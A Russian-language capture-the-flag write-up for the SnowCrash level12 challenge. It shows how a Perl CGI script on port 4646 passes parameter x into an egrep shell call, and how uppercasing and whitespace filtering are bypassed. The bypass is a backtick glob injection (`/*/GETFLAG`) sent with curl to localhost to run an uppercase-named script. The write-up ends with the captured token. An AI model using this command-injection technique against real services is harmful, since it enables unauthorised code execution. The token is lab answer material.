В домашнем каталоге perl-скрипт с разрешениями от flag12:

Скрипт открывает Common Gateway Interface по порту 4646, ожидая параметров x и y.
Запускается подпрограмма n, которая запускает подпрограмму t с параметрами x и y и оценивает ее выходные данные.
В подпрограмме t запусткается подпроцесс для смены каталога на /tmp, 
выполняется egrep и оценивается его вывод. 
Необходимо внедрить код через параметр x, чтобы он выполнялся вместе с командой grep.

Также необходимо учитывать преобразования аргумента x:

$xx =~ tr/a-z/A-Z/: все буквы будут в верхнем регистре
$xx =~ s/\s.*//: аргумент должен начинаться с пробельных символов, за которыми следуют символы. 
Все, начиная с первого не символа, будет игнорироваться.
Это означает, что:

мы не можем предоставить обычную команду, так как она будет написана с большой буквы:

level12@SnowCrash:/tmp\$ ./level12.pl x="getflag"
Content-type: text/html

xx = GETFLAG
мы не можем использовать переменную среды, так как все, начиная с $, будет игнорироваться:

level12@SnowCrash:/tmp$ ./level12.pl x="\$TEST"
Content-type: text/html

xx =
Таким образом, одним из решений может быть сохранение нашей команды в файле с именем в верхнем регистре, чтобы соблюдать проверку регулярных выражений:

level12@SnowCrash:/tmp$ echo "getflag > /tmp/token" > /tmp/GETFLAG && chmod a+x /tmp/GETFLAG
level12@SnowCrash:/tmp$ curl '127.0.0.1:4646?x="`/*/GETFLAG`"' && cat /tmp/token
..Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
